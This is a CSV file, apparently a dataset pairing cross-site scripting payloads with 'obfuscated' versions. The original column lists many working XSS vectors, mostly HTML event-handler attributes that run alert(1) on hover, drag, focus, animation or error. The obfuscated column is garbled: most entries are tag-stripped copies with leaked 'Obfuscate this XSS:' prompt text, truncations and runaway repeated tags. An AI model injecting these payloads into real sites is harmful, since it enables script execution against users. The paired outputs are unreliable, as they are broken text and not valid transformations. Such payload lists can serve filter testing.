original,ofuscado
"<tt onmouseover=""alert(1)"">test</tt>","XSS: tt onmouseover=""alert(1)"">test/tt>"
<a onblur=alert(1) tabindex=1 id=x></a><input autofocus>,XSS: a onblur=alert(1) tabindex=1 id=x>/a>input autofocus>
"<col draggable=""true"" ondragenter=""alert(1)"">test</col>","alert(1)"">test/col>"
<caption onpointerdown=alert(1)>xss</caption>,XSS: caption onpointerdown=alert(1)>xss/caption>
<caption id=x tabindex=1 ondeactivate=alert(1)></caption><input id=y autofocus>,XSS: caption id=x tabindex=1 ondeactivate=alert(1)>/caption>input id=y autofocus>
"<style onmouseleave=""alert(1)"">test</style>","s: style onmouseleave=""alert(1)"">test/style>"
<svg><meta onload=alert(1)></meta>,XSS: XSS XSS: svg>meta onload=alert(1)>/meta>
<figcaption onpointerleave=alert(1)>xss</figcaption>,and as XSS. the:caption onpointerleave=alert(1)>xss/figcaption>>::XSS: figcaption onpointerleave=alert(1)>xss/figcaption>.
<datalist id=x tabindex=1 onfocusin=alert(1)></datalist>,:datalist id=x tabindex=1 onfocusin=alert(1)>/datalist>
<input type=image src=1 onerror=alert(1)>,uns XSS: input type=image image src=1 onerror=alert(1)>
"<strong ondblclick=""alert(1)"">test</strong>",>test/strong>
"<div draggable=""true"" contenteditable>drag me</div><input ondragover=alert(1) contenteditable>drop here</input>","this XSS: div draggable=""true"" contenteditable>drag me/div>input ondragover=alert(1) contenteditable>drop here/input>"
"<spacer onkeypress=""alert(1)"" contenteditable>test</spacer>","XSS: spacer onkeypress=""alert(1)"" contenteditable>test/spacer>"
"<style>@keyframes slidein {}</style><center style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></center>",":/style>@keyframes slidein /style>center style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)"">/center>/center>/center>/center>/center>/center style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationit"
"<pre draggable=""true"" ondragend=""alert(1)"">test</pre>",":=""true"" ondragend=""alert(1)"">test/pre>"
<colgroup onblur=alert(1) tabindex=1 id=x></colgroup><input autofocus>,colgroup onblur=alert(1) tabindex=1 id=x>/colgroup>input autofocus>
"<style>@keyframes x{}</style><main style=""animation-name:x"" onanimationstart=""alert(1)""></main>","t() XSS: style>@keyframes x/style>main style=""animation-name:x"" onanimationstart=""alert(1)"">/main>/main>/main>/main>/main> XSS: style>@keyframes x/style>main style=""animation-name:x"" onanimationstart=""alert(1)"">/main>/main>"
"<article draggable=""true"" ondrag=""alert(1)"">test</article>","article draggable=""true"" ondrag=""alert(1)"">test/article>"
"<rtc draggable=""true"" ondragleave=""alert(1)"">test</rtc>",": rtc draggable=""true"" ondragleave=""alert(1)"">test/rtc>"
"<div draggable=""true"" contenteditable>drag me</div><sup ondrop=alert(1) contenteditable>drop here</sup>",">obfuscate this XSS: div draggable=""true"" contenteditable>drag me/div>sup ondrop=alert(1) contenteditable>drop here/sup>"
"<frame oncut=""alert(1)"" contenteditable>test</frame>",", frame oncut=""alert(1)"" contenteditable>test/frame>"
"<frameset onmouseover=""alert(1)"">test</frameset>",": frameset onmouseover=""alert(1)"">test/frameset>"
"<style>@keyframes x{}</style><nobr style=""animation-name:x"" onanimationstart=""alert(1)""></nobr>","style>@keyframes x/style>nobr style=""animation-name:x"" onanimationstart=""alert(1)"">/nobr>"
<iframe onload=alert(1)></iframe>,: iframe onload=alert(1)>/iframe>
"<strong draggable=""true"" ondragstart=""alert(1)"">test</strong>",>test/strong>
"<style>@keyframes x{}</style><h1 style=""animation-name:x"" onanimationstart=""alert(1)""></h1>","/h1 style=""animation-name:x"" style=""animation-name:x"" onanimationstart=""alert(1)"">/h1>/h1>>/h1>/h1>/h1>/h1>h1>/h1>/h1>/h1>/h1>/h1>/h1>/h1>/h1>/h1>/"
<article onpointerleave=alert(1)>xss</article>,Obfuscate this XSS:article onpointerleave=alert(1)>xss/article>
"<nextid onmousemove=""alert(1)"">test</nextid>","d> and/or nextid onmousemove=""alert(1)"">test/nextid>"
javascript:document.location=,XSS: javascript:document.location=
"<style>@keyframes x{}</style><area style=""animation-name:x"" onanimationend=""alert(1)""></area>","style>@keyframes x/style>area styles=""animation-name:x"" onanimationend=""alert(1)"">/area>/area>"
<blockquote onpointermove=alert(1)>xss</blockquote>,Obfuscate this XSS: blockquote onpointermove=alert(1)>xss/blockquote>
<time onfocusout=alert(1) tabindex=1 id=x></time><input autofocus>,/time>input autofocus>:...time onfocusout=alert(1) tabindex=1 id=x>/time>input autofocus>
"<style>@keyframes x{}</style><title style=""animation-name:x"" onanimationend=""alert(1)""></title>","style=""animation-name:x"" onanimationend=""alert(1)"">/title>/title>."
<noembed onpointerout=alert(1)>xss</noembed>,",.: noembed onpointerout=alert(1)>xss/noembed> | XSS: noembed onpointerout=alert(1)>xss/noembed>"
"<data onbeforecut=""alert(1)"" contenteditable>test</data>","- data onbeforecut=""alert(1)"" contenteditable>test/data>"
"<a href=""http://ha.ckers.org@google""></a>","XSS: a href=""http://ha.ckers.org@google"">/a>> a href=""http://ha.ckers.org@google"">/a>"
"<plaintext oncut=""alert(1)"" contenteditable>test</plaintext>","? XSS: plaintext oncut=""alert(1)"" contenteditable>test/plaintext>"
"<s onmousedown=""alert(1)"">test</s>",": s onmousedown=""alert(1)"">test"
"<address onkeypress=""alert(1)"" contenteditable>test</address>",": address onkeypress=""alert(1)"" contenteditable>test/address>"
"<optgroup onmouseover=""alert(1)"">test</optgroup>","the XSS: optgroup onmouseover=""alert(1)"">test/optgroup>"
"<script onmouseover=""alert(1)"">test</script>","xSS: script onmouseover=""alert(1)"">test/script>"
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><sub id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></sub>","style>@keyframes xfrom left:0;to left: 1000px;:target animation:10s ease-in-out 0s 1 x;/style>sub id=x style=""position:absolute;"" onanimationcancel=""alert(1)"">/sub>sub>sub>sub>sub>sub>sub>sub id=x style=""position"
"<image onclick=""alert(1)"">test</image>",>test/image>
"<tfoot onclick=""alert(1)"">test</tfoot>","Obfuscate this XSS: tfoot onclick=""alert(1)"">test/tfoot>"
<ul onpointerenter=alert(1)>xss</ul>,SS onpointerenter=alert(1)>xss/ul> Oblicate this XSS: ul onpointerenter=alert(1)>xss/ul>
"<bdo draggable=""true"" ondragenter=""alert(1)"">test</bdo>",": bdo draggable=""true"" ondragenter=""alert(1)"">test/bdo>"
<spacer id=x tabindex=1 onbeforeactivate=alert(1)></spacer>,in the process of activating.>/spacer>>.
"<style>@keyframes slidein {}</style><shadow style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></shadow>","XSS:style>@keyframes slidein /style>shadow style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)"">/shadow>/shadow>/shadow>/shadow> XSS: style>@keyframes slidein /style>shadow style=""animation-duration:1s;animation-name:s"
<noscript id=x tabindex=1 onfocusin=alert(1)></noscript>,XSS : noscript id=x tabindex=1 onfocusin=alert(1)>/noscript>
"<dd onmouseout=""alert(1)"">test</dd>","this XSS: dd onmouseout=""alert(1)"">test/dd>"
<pre id=x tabindex=1 onbeforedeactivate=alert(1)></pre><input autofocus>,_output autofocus>/pre>input autofocus>
"<data draggable=""true"" ondragstart=""alert(1)"">test</data>","s: data draggable=""true"" ondragstart=""alert(1)"">test/data>"
"<sub draggable=""true"" ondragend=""alert(1)"">test</sub>","” ondragend=""alert(1)"">test/sub>"
"<dialog draggable=""true"" ondragenter=""alert(1)"">test</dialog>","this XSS: dialog draggable=""true"" ondragenter=""alert(1)"">test/dialog>"
<iframe onblur=alert(1) id=x><input autofocus>,x>autofocus>
<legend id=x tabindex=1 ondeactivate=alert(1)></legend><input id=y autofocus>,:legend id=x tabindex=1 ondeactivate=alert(1)>/legend>input id=y autofocus>
<meter id=x tabindex=1 onbeforedeactivate=alert(1)></meter><input autofocus>,meter id=x tabindex=1 onbeforedeactivate=alert(1)>/meter>input autofocus>
"<em draggable=""true"" ondragleave=""alert(1)"">test</em>","XSS: em draggable=""true"" ondragleave=""alert(1)"">test/em>"
"<small onbeforecut=""alert(1)"" contenteditable>test</small>",>test/small>
"<article draggable=""true"" ondragstart=""alert(1)"">test</article>",>test/article>
"<cite onkeyup=""alert(1)"" contenteditable>test</cite>",>test/cite>
<u onblur=alert(1) tabindex=1 id=x></u><input autofocus>,u onblur=alert(1) tabindex=1 id=x>/u>input autofocus>
<data onpointerleave=alert(1)>xss</data>,Objet: data onpointerleave=alert(1)>xss/data>
"<audio draggable=""true"" ondragend=""alert(1)"">test</audio>",with a button set.
"<dd onbeforecopy=""alert(1)"" contenteditable>test</dd>",analytics/dd>
<del id=x tabindex=1 onactivate=alert(1)></del>,del id=x tabindex=1 onactivate=alert(1)>/del>
"<svg onbeforecut=""alert(1)"" contenteditable>test</svg>","(svg onbeforecut=""alert(1)"" contenteditable>test/svg>"
<optgroup onpointerover=alert(1)>xss</optgroup>,XSS: optgroup onpointerover=alert(1)>xss/optgroup>
<audio onpointermove=alert(1)>xss</audio>,=alert(1)>xss/audio>.
"<aside onmouseout=""alert(1)"">test</aside>","in onmouseout=""alert(1)"">test/aside>"
"<canvas onbeforecut=""alert(1)"" contenteditable>test</canvas>","? ?obfuscate this XSS: canvas onbeforecut=""alert(1)"" contenteditable>test/canvas>"
"<div draggable=""true"" contenteditable>drag me</div><section ondragover=alert(1) contenteditable>drop here</section>","the XSS: div draggable=""true"" contenteditable>drag me/div>section ondragover=alert(1) contenteditable>drop here/section>"
"<tbody draggable=""true"" ondragenter=""alert(1)"">test</tbody>",": tbody draggable=""true"" ondragenter=""alert(1)"">test/tbody>"
"<object onmousedown=""alert(1)"">test</object>",": object onmousedown=""alert(1)"">test/object>"
"<area onbeforepaste=""alert(1)"" contenteditable>test</area>",/area> test/area>
<template onpointerout=alert(1)>xss</template>,Obfuscate this XSS: template onpointerout=alert(1)>xss/template>
<s onpointerup=alert(1)>xss</s>,Obfuscate this XSS: s onpointerup=alert(1)>xss
"<select draggable=""true"" ondrag=""alert(1)"">test</select>",":>>test/select>>test/select> XSS: select draggable=""true"" ondrag=""alert(1)"">test/select>"
"<a onmouseup=""alert(1)"">test</a>","XSS: a onmouseup=""alert(1)"">test/a>"
"<style>:target {color: red;}</style><pre id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></pre>","""style>:target color: red;/style>pre id=x style=""transition:color 10s"" ontransitioncancel=alert(1)>/pre>/pre>/pre>/pre>/pre>/pre>/pre>/pre>"
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><a id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></a>",":/style>a id=x style=""position:absolute;"" onanimationcancel=""alert(1)"">/a>.x style=""position:absolute;"" style=""position:absolute;"" onanimationcancel=""alert(1)"">/a>/a>/a> a>/a>/a>/a>/a>a id=x style=""position:absolu"
<main onfocusout=alert(1) tabindex=1 id=x></main><input autofocus>,/main>input autofocus>
"<time onclick=""alert(1)"">test</time>",/time>>test/time>
"<canvas onbeforepaste=""alert(1)"" contenteditable>test</canvas>",": canvas onbeforepaste=""alert(1)"" contenteditable>test/canvas>"
<figure id=x tabindex=1 ondeactivate=alert(1)></figure><input id=y autofocus>,: figure id=x tabindex=1 ondeactivate=alert(1)>/figure>input id=y autofocus>
"<center onclick=""alert(1)"">test</center>",": center onclick=""alert(1)"">test/center>"
"<h1 draggable=""true"" ondragleave=""alert(1)"">test</h1>","Obfuscate this XSS: h1 draggable=""true"" ondragleave=""alert(1)"">test/h1>"
"<div onkeyup=""alert(1)"" contenteditable>test</div>","ep, div onkeyup=""alert(1)"" contenteditable>test/div>"
<marquee id=x tabindex=1 onbeforedeactivate=alert(1)></marquee><input autofocus>,input autofocus>
"<dl draggable=""true"" ondrag=""alert(1)"">test</dl>","the XSS: dl draggable=""true"" ondrag=""alert(1)"">test/dl>"
<div onpointerout=alert(1)>xss</div>,? ( xss/div>)
"<style>:target {color:red;}</style><slot id=x style=""transition:color 1s"" ontransitionend=alert(1)></slot>","=x style=""transition:color 1s"" ontransitionend=alert(1)>/slot>/slot>/slot>slot>slot id=x style=""transition:color 1s"" ontransitionend=alert(1)>/slot>slot>slot>/slot>slot>"
"<applet onmouseover=""alert(1)"">test</applet>","the application: applet onmouseover=""alert(1)"">test/applet>"
"<figure onbeforecut=""alert(1)"" contenteditable>test</figure>","-"" contenteditable>test/figure>"
"<canvas onmousemove=""alert(1)"">test</canvas>","d=0. Canvas onmousemove=""alert(1)"">test/canvas>"
"<h1 onpaste=""alert(1)"" contenteditable>test</h1>","XSS h1 onpaste=""alert(1)"" contenteditable>test/h1>"
<area onfocusout=alert(1) tabindex=1 id=x></area><input autofocus>,:. XSS: area onfocusout=alert(1) tabindex=1 id=x>/area>input autofocus>
<textarea onpointermove=alert(1)>xss</textarea>,: textarea onpointermove=alert(1)>xss/textarea>.
document.write,Obfuscate this XSS: document.write
<area onpointerenter=alert(1)>xss</area>,XSS: area onpointerenter=alert(1)>xss/area>
"<marquee onbeforecut=""alert(1)"" contenteditable>test</marquee>",/marquee>
"<audio oncontextmenu=""alert(1)"">test</audio>","audio oncontextmenu=""alert(1)"">test/audio>"
<isindex onpointerup=alert(1)>xss</isindex>,isindex onpointerup=alert(1)>xss/isindex>.
"<strike onmouseup=""alert(1)"">test</strike>",>test/strike>/strike>.
<kbd id=x tabindex=1 onfocus=alert(1)></kbd>,this XSS: kbd id=x tabindex=1 onfocus=alert(1)>/kbd>
"<table onbeforepaste=""alert(1)"" contenteditable>test</table>","noting that: table onbeforepaste=""alert(1)"" contenteditable>test/table>"
"<hr draggable=""true"" ondragleave=""alert(1)"">test</hr>",>test/hr>
"<summary onpaste=""alert(1)"" contenteditable>test</summary>","Obfuscate this XSS: summary onpaste=""alert(1)"" contenteditable>test/summary>"
<bdo id=x tabindex=1 onactivate=alert(1)></bdo>,XSS: bdo id=x tabindex=1 onactivate=alert(1)>/bdo>
"<video onmouseout=""alert(1)"">test</video>",": video onmouseout=""alert(1)"">test/video>"
"<nav onclick=""alert(1)"">test</nav>",": nav onclick=""alert(1)"">test/nav>"
"<noembed onkeyup=""alert(1)"" contenteditable>test</noembed>","embed onkeyup=""alert(1)"" contenteditable>test/noembed>"
"<area draggable=""true"" ondragstart=""alert(1)"">test</area>","= area draggable=""true"" ondragstart=""alert(1)"">test/area>"
<video onpointermove=alert(1)>xss</video>,: video onpointermove=alert(1)>xss/video>
<input onchange=alert(1) value=xss>,d=alert(1) value=xss>.
"<center draggable=""true"" ondrag=""alert(1)"">test</center>",>test/center>
<dd id=x tabindex=1 onbeforeactivate=alert(1)></dd>,: dd id=x tabindex=1 onbeforeactivate=alert(1)>/dd>
<ruby onblur=alert(1) tabindex=1 id=x></ruby><input autofocus>,Obfuscate this XSS: ruby onblur=alert(1) tabindex=1 id=x>/ruby>input autofocus>
"<keygen onclick=""alert(1)"">test</keygen>",": keygen onclick=""alert(1)"">test/keygen>"
"<meter oncut=""alert(1)"" contenteditable>test</meter>",": meter oncut=""alert(1)"" contenteditable>test/meter>"
"<style>@keyframes x{}</style><body style=""animation-name:x"" onanimationstart=""alert(1)""></body>","body styling=""animation-name:x"" onanimationstart=""alert(1)"">/body>/body>"
<strike onpointerover=alert(1)>xss</strike>,xss - strike onpointerover=alert(1)>xss/strike>
"<style>:target {color:red;}</style><picture id=x style=""transition:color 1s"" ontransitionend=alert(1)></picture>","s"" ontransitionend=alert(1)>/picture>"
"<main onmousedown=""alert(1)"">test</main>",": main onmousedown=""alert(1)"">test/main>"
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><figcaption id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></figcaption>","s style=""position:absolute;"" onanimationcancel=""alert(1)"">/figcaption>figcaption id=x style=""position:absolute;"" onanimationcancel=""alert(1)"">/figcaption>figcaption id=x style=""position:absolute;"" onanimationcancel=""alert(1)"">/figcaption>figcaption>@keyframes xfrom "
"<command oncontextmenu=""alert(1)"">test</command>","that this XSS XSS: command oncontextmenu=""alert(1)"">test/command>"
"<style>@keyframes x{}</style><title style=""animation-name:x"" onanimationstart=""alert(1)""></title>","/title>title style=""animation-name:x"" onanimationstart=""alert(1)"">/title>/title>>/title>>/title>>>>>>>'/title>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>"
"<link onkeydown=""alert(1)"" contenteditable>test</link>","xSS: link onkeydown=""alert(1)"" contenteditable>test/link>"
<command onpointerover=alert(1)>xss</command>,r/command>ss: command onpointerover=alert(1)>xss/command>xss>xss> xss>.
<input id=x tabindex=1 onactivate=alert(1)></input>,: >input id=x tabindex=1 onactivate=alert(1)>/input>
"<tr onpaste=""alert(1)"" contenteditable>test</tr>",": tr onpaste=""alert(1)"" contenteditable>test/tr>"
"<samp onmousemove=""alert(1)"">test</samp>",": samp onmousemove=""alert(1)"">test/samp>"
"<script onmousemove=""alert(1)"">test</script>","> script onmousemove=""alert(1)"">test/script>"
"<td onmouseenter=""alert(1)"">test</td>","td onmouseenter=""alert(1)"">test/td>"
"<style>@keyframes slidein {}</style><ins style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></ins>","-editor:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)"">/ins>/ins>/ins>/ins>/ins style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)"">/ins>/ins>"
"<form draggable=""true"" ondragend=""alert(1)"">test</form>","XSS: form draggable=""true"" ondragend=""alert(1)"">test/form>"
